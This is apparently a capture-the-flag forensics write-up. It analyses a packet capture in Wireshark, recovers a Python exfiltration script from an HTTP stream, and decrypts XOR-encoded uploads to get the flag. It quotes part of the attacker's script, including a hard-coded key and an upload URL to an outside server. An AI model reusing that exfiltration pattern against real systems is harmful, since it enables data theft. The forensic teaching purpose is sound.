# Baby Exfil

### 1. Introduction

We are tasked with analyzing a packet capture (`final.pcapng`) for Team K\&K. They suspect data is being stolen. Our job is to find out what was taken and retrieve the flag.

### 2. identifying the Exfiltration (The "What")

The first step is to filter the noise. Since most data theft happens over the web, we start by filtering for HTTP traffic in Wireshark.

Filter: `http`

Scanning through the logs, we see suspicious POST requests to a `/upload` endpoint. This indicates data is being sent _out_ of the network.

Looking at the packet details, we see:

* Filename: `HNderw.png` (and others like `3G2BHzj.jpeg`)
* Content: It’s not an image; it’s a long string of Hexadecimal characters (e.g., `b8e8b8eb...`).

We can export these objects via `File > Export Objects > HTTP` to save them for later. However, the files are clearly encrypted or encoded, as they don't open as images. We need to find the encryption key.

### 3. Finding the "Smoking Gun" (The Key)

Continuing our analysis of the HTTP traffic, we look for how the attacker might have executed this. We scroll through the packets or search for other file transfers.

At Frame 7560, we spot a very interesting GET request. The machine downloaded a Python script named `JdRlPr1.py`.

Request in Frame 7560:

```http
GET /JdRlPr1.py HTTP/1.1
Host: 35.238.80.16:8000
...
```

The Response (The Malware Source Code):

We follow the HTTP Stream for this packet, and we see the server responding with the actual source code of the malware!

```python
HTTP/1.0 200 OK
...
import os
import requests

key = "G0G0Squ1d3Ncrypt10n"  # <--- WE FOUND THE KEY!
server = "http://34.134.77.90:8080/upload"

def xor_file(data, key):
    result = bytearray()
    for i in range(len(data)):
        result.append(data[i] ^ ord(key[i % len(key)]))
    return bytes(result)
...
```

Analysis:

1. Key Found: `G0G0Squ1d3Ncrypt10n`
2. Algorithm Identified: The script uses XOR encryption.
3. Process: It reads a file $$ $\rightarrow$ $$ XORs it with the key $$ $\rightarrow$ $$ converts it to Hex $$ $\rightarrow$ $$uploads it.

### 4. The Solution (Decryption)

Now that we have the Encrypted Payload (from the POST request) and the Key (from the GET request), we can reverse the process.

The Logic:

Since XOR is symmetric, to decrypt we just reverse the order:

1. Convert the Hex string back to Bytes.
2. XOR the bytes with the key `G0G0Squ1d3Ncrypt10n`.

Solver Script:

```python
def xor_decrypt(hex_data, key):
    # 1. Convert Hex to Bytes
    encrypted_bytes = bytes.fromhex(hex_data)
    
    # 2. Prepare Key
    key_bytes = key.encode()
    decrypted_result = bytearray()

    # 3. XOR Operation
    for i in range(len(encrypted_bytes)):
        decrypted_result.append(encrypted_bytes[i] ^ key_bytes[i % len(key_bytes)])
    
    return decrypted_result

# The Key we found in Frame 7560
key = "G0G0Squ1d3Ncrypt10n"

# Copy the hex string from the 'HNderw.png' packet in Wireshark
payload = "b8e8b8eb..." # (Truncated for brevity)

# Decrypt and Save
decrypted_data = xor_decrypt(payload, key)

with open("flag.png", "wb") as f:
    f.write(decrypted_data)

print("Decrypted! Open flag.png to see the flag.")
```

### 5. Conclusion

Running the script recovers the original image. Opening `flag.png` reveals the secret message.

Lessons Learned:

* Context matters: Don't just look at the stolen data; look at what happened _before_ the theft. The attacker often downloads their tools (like `JdRlPr1.py`) in cleartext.
* Analyze the Script: Finding the tool the attacker used usually gives you the exact algorithm and key needed to solve the challenge.

Flag:

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

